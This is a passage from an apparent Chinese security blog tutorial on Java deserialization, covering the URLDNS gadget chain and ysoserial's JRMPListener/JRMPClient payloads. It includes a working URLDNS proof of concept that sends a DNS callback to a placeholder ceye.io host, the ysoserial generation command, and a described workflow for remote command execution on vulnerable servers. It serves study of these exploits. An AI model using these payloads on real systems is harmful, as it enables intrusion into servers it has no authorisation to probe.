class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第二种：通过main函数直接生成</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/4.png"></div><p>但不知道为什么没有成功弹shell</p><h1 id="java反序列化入门（三）URLDNS链学习"><a href="#java反序列化入门（三）URLDNS链学习" class="headerlink" title="java反序列化入门（三）URLDNS链学习"></a>java反序列化入门（三）URLDNS链学习</h1><h2 id="URLDNS链的作用"><a href="#URLDNS链的作用" class="headerlink" title="URLDNS链的作用"></a>URLDNS链的作用</h2><p>当我们用反序列化payload打对方后没有什么回应，那么就不知道哪里出了问题：</p><p>1.打成功了，只是对方机器不能出网？<br>2.还是对面JAVA环境与payload版本不一样，改改就可以？<br>3.还是对方没有用这个payload利用链的所需库？利用链所需库的版本不对？换换就可以？<br>4.还是…以上做的都是瞎操作，这里压根没有反序列化readobject点QAQ</p><p>而URLDNS模块正是解决了以上疑惑的最后一个，确认了readobject反序列化利用点的存在。不至于payload改来改去却发现最后是因为压根没有利用点所以没用。同时因为这个利用链不依赖任何第三方库，没有什么限制。</p><p>如果目标服务器存在反序列化动作（readobject），处理了我们的输入，同时按照我们给定的URL地址完成了DNS查询，我们就可以确认是存在反序列化利用点的。</p><p>从JAVA反序列化RCE的三要素（readobject反序列化利用点 + 利用链 + RCE触发点）来说，是通过（readobject反序列化利用点 + DNS查询）来确认readobject反序列化利用点的存在。</p><p>ysoserial payload生成命令：java -jar ysoserial.jar URLDNS “自己能够查询DNS记录的域名”<br>（这里可以使用ceye做DNS查询）</p><p>我们先抛开ysoserial，看一下网上的测试代码弄清楚原理，在之后再回过来看ysoserial的实现。</p><h2 id="POC分析："><a href="#POC分析：" class="headerlink" title="POC分析："></a>POC分析：</h2><p>POC测试代码：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> test<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//0x01.生成payload</span>        <span class="token comment" spellcheck="true">//设置一个hashMap</span>        HashMap<span class="token operator">&lt;</span>URL<span class="token punctuation">,</span> String<span class="token operator">></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>URL<span class="token punctuation">,</span> String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//设置我们可以接受DNS查询的地址</span>        URL url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://xxx.ceye.io"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//将URL的hashCode字段设置为允许修改</span>        Field f <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**</span>        <span class="token comment" spellcheck="true">//1. 设置url的hashCode字段为0xdeadbeef（随意的值）</span>        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//2. 将url放入hashMap中，右边参数随便写</span>        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token string">"rmb122"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）</span>        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//0x02.写入文件模拟网络传输</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"out.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//0x03.读取文件，进行反序列化触发payload</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"out.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里注意到这三个名词：hashCode、HashMap、URL，接下来动态调试readObject</p><h2 id="样例反序列化过程"><a href="#样例反序列化过程" class="headerlink" title="样例反序列化过程"></a>样例反序列化过程</h2><p><strong>HashMap序列化的过程</strong></p><p>source code：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">writeObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream s<span class="token punctuation">)</span>        <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        <span class="token keyword">int</span> buckets <span class="token operator">=</span> <span class="token function">capacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Write out the threshold, loadfactor, and any hidden stuff</span>        s<span class="token punctuation">.</span><span class="token function">defaultWriteObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        s<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span>buckets<span class="token punctuation">)</span><span class="token punctuation">;</span>        s<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">internalWriteEntries</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大概是这么做的：<br>1.写入一维数组的size<br>2.写入键值对的个数<br>3.逐步写入key和value</p><p><strong>HashMap反序列化的过程</strong></p><p>source code and comment</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream s<span class="token punctuation">)</span>         <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//...省略代码...</span>    <span class="token comment" spellcheck="true">//读取一维数组长度，不处理</span>    <span class="token comment" spellcheck="true">//读取键值对个数mappings</span>    <span class="token comment" spellcheck="true">//处理其他操作并初始化</span>    <span class="token comment" spellcheck="true">//遍历反序列化分辨读取key和value</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> mappings<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//URL类也有readObject方法，此处也会执行，但是DNS查询行为不在这，我们跳过</span>            K key <span class="token operator">=</span> <span class="token punctuation">(</span>K<span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            V value <span class="token operator">=</span> <span class="token punctuation">(</span>V<span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//注意以下这句话</span>        <span class="token function">putVal</span><span class="token punctuation">(</span><span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>hash函数source code</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">hash</span><span class="token punctuation">(</span>Object key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> h<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token punctuation">(</span>h <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>传入的key是一个URL对象，不同对象的hash计算方法是在各自的类中实现的，这里key.hashCode()调用URL类中的hashCode方法：java.net.URL#hashCode</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/5.png"></div><p>我们看到调试进入的是URL类中的hashCode方法</p><p>source code</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//此处传入的URL为我们自主写入的接受DNS查询的URL</span><span class="token keyword">protected</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span>URL u<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> h <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//计算的hash结果</span>    <span class="token comment" spellcheck="true">//使用url的协议部分，计算hash</span>    String protocol <span class="token operator">=</span> u<span class="token punctuation">.</span><span class="token function">getProtocol</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>protocol <span class="token operator">!=</span> null<span class="token punctuation">)</span>        h <span class="token operator">+=</span> protocol<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//**通过url获取目标IP地址**，再计算hash拼接进入</span>    InetAddress addr <span class="token operator">=</span> <span class="token function">getHostAddress</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>addr <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        h <span class="token operator">+=</span> addr<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//如果没有获取到，就直接把域名计算hash拼接进入</span>        String host <span class="token operator">=</span> u<span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>host <span class="token operator">!=</span> null<span class="token punctuation">)</span>            h <span class="token operator">+=</span> host<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至此我们就看到了getHostAddress(u)这一关键语句，通过我们提供的URL地址去获取对应的IP。再往后还有一些函数调用，但是更为底层，而不太关键，就不继续跟了。</p><p>URL要传入一个域名而不能是一个IP，IP不会触发DNS查询是在java.net.InetAddress#getAllByName(java.lang.String, java.net.InetAddress)中进行了限制</p><p>那么总结下java1.8中的调用链：</p><p>1.HashMap-&gt;readObject()<br>2.readObject()-&gt; hash()<br>3.hash()-&gt; URL#hashCode()<br>4.URL#hashCode()-&gt;getHostAddress()</p><h2 id="回看payload的生成"><a href="#回看payload的生成" class="headerlink" title="回看payload的生成"></a>回看payload的生成</h2><p>payload满足：<br>1.HashMap有一个URL的键值对<br>2.这个URL对象的Hashcode为-1</p><pre class="line-numbers language-java"><code class="language-java">HashMap<span class="token operator">&lt;</span>URL<span class="token punctuation">,</span> String<span class="token operator">></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>URL<span class="token punctuation">,</span> String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//设置我们可以接受DNS查询的地址</span>URL url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://xxx.ceye.io"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将URL的hashCode字段设置为允许修改</span>Field f <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//**以下的操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**</span><span class="token comment" spellcheck="true">//1. 设置url的hashCode字段为0xdeadbeef（随意的值）</span>f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//2. 将url放入hashMap中，右边参数随便写</span>hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token string">"rmb122"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）</span>f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前面创建hashmap，url对象，由于hashCode是private属性，更改访问权限让它变得允许修改都没问题。</p><p>但是下面这块为啥不能直接把URL对象put进去hashmap就好了？反而要设置成别的值再设置回来</p><p>注意这个函数：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> V <span class="token function">put</span><span class="token punctuation">(</span>K key<span class="token punctuation">,</span> V value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">putVal</span><span class="token punctuation">(</span><span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以发现put里面的语句跟我们之前看到的会触发DNS查询的语句一模一样，同时URL对象再初始化之后的hashCode默认为-1。</p><p>也就是说在我们生成payload的过程中，如果不做任何修改就直接把URL对象放入HashMap是在本地触发一次DNS查询的。</p><p>这时候hashCode默认为-1，然后就会进入hash(key)触发DNS查询。这就会混淆是你本地的查询还是对方机器的查询的DNS。在put之前修改个hashCode，就可以避免触发。</p><p>而在put了之后：</p><p>1.如果之前没有f.set(url, 0xdeadbeef);修改hashCode，就会完成DNS查询的同时，计算出hashCode，从而修改成不为-1的值。这个hashcode会被序列化传输，到对方机器时就会因为不是-1而跳过DNS查询流程<br>2.如果之前修改了hashCode，那自然也会直接被序列化传输，不是-1也会跳过DNS查询流程。</p><p>所以需要f.set(url, -1);把这个字段改回来-1。</p><h1 id="java反序列化入门（四）ysoserial-exploit：JRMPClient-JRMPListener链学习"><a href="#java反序列化入门（四）ysoserial-exploit：JRMPClient-JRMPListener链学习" class="headerlink" title="java反序列化入门（四）ysoserial exploit：JRMPClient/JRMPListener链学习"></a>java反序列化入门（四）ysoserial exploit：JRMPClient/JRMPListener链学习</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>ysoserial中的exploit/JRMPClient是作为攻击方的代码，一般会结合payloads/JRMPLIstener使用，攻击流程就是：</p><p>1、先往存在漏洞的服务器发送payloads/JRMPLIstener，使服务器反序列化该payload后，会开启一个rmi服务并监听在设置的端口</p><p>2、然后攻击方在自己的服务器使用exploit/JRMPClient与存在漏洞的服务器进行通信，并且发送一个可命令执行的payload（假如存在漏洞的服务器中有使用org.apacje.commons.collections包，则可以发送CommonsCollections系列的payload），从而达到命令执行的结果。</p><p>下面就分别分析一下exploit/JRMPClient与payloads/JRMPLIstener</p><h2 id="payloads-JRMPListenser链学习"><a href="#payloads-JRMPListenser链学习" class="headerlink" title="payloads/JRMPListenser链学习"></a>payloads/JRMPListenser链学习</h2><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>之前一直没搞懂是如何调用UnicastRemoteObject中的readObject函数的，这里一步一步的分析吧：</p><p>首先是</p><p>JEMPListener源码：</p><p>其实跑JRMPListener代码会首先运行PayloadRunner.run函数：然后通过边调试边理解每个语句的内容，JAVA特性已经忘的差不多了。。。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PayloadRunner</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token keyword">final</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">ObjectPayload</span><span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">>></span> clazz<span class="token punctuation">,</span> <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// ensure payload generation doesn't throw an exception</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialized <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExecCheckingSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">callWrapped</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Callable</span><span class="token operator">&lt;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>                <span class="token keyword">final</span> String command <span class="token operator">=</span> args<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> null <span class="token operator">?</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token function">getDefaultTestCmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"generating payload object(s) for command: '"</span> <span class="token operator">+</span> command <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                ObjectPayload<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> payload <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 创建新的对象，无参构造</span>                <span class="token keyword">final</span> Object objBefore <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token function">getObject</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//调用getObject函数</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"serializing payload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ser <span class="token operator">=</span> Serializer<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>objBefore<span class="token punctuation">)</span><span class="token punctuation">;</span>                Utils<span class="token punctuation">.</span><span class="token function">releasePayload</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> objBefore<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> ser<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"deserializing payload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">final</span> Object objAfter <span class="token operator">=</span> Deserializer<span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span>serialized<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JRMPListener</span> <span class="token keyword">extends</span> <span class="token class-name">PayloadRunner</span> <span class="token keyword">implements</span> <span class="token class-name">ObjectPayload</span><span class="token operator">&lt;</span>UnicastRemoteObject<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> UnicastRemoteObject <span class="token function">getObject</span><span class="token punctuation">(</span><span class="token keyword">final</span> String command<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//设置jrmp监听端口</span>        <span class="token keyword">int</span> jrmpPort <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//调用RemoteObject类的构造方法，new UnicastServerRef(jrmpPort)作为构造方法的参数，然后返回一个ActivationGroupImpl类型的对象，ActivationGroupImpl继承ActivationGroup，ActivationGroup继承UnicastRemoteObject</span>        UnicastRemoteObject uro <span class="token operator">=</span> Reflections<span class="token punctuation">.</span><span class="token function">createWithConstructor</span><span class="token punctuation">(</span>ActivationGroupImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> RemoteObject<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>            RemoteRef<span class="token punctuation">.</span><span class="token keyword">class</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>            <span class="token keyword">new</span> <span class="token class-name">UnicastServerRef</span><span class="token punctuation">(</span>jrmpPort<span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//通过反射设置uro对象中的port属性值为jrmpPort</span>        Reflections<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span>UnicastRemoteObject<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string">"port"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>uro<span class="token punctuation">,</span> jrmpPort<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> uro<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/6.png"></div>我们看到在执行完getObject的时候返回的对象是ActivationGroupImpl，ActivationGroupImpl继承ActivationGroup，ActivationGroup继承UnicastRemoteObject。<p>这就牵扯到一点就是继承，子类在实现父类的方法后，通过子类new一个对象调用该方法那么调用的是子类的方法，如果b方法没有实现，子类同样可以调用b方法。在上面就是虽然ActivationGroupImpl没有定义readObject方法，但是在其父类中定义了readObject函数，那么在进行反序列化的时候就会调用这个函数。</p><p>Reflections.createWithConstructor：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> T <span class="token function">createWithConstructor</span> <span class="token 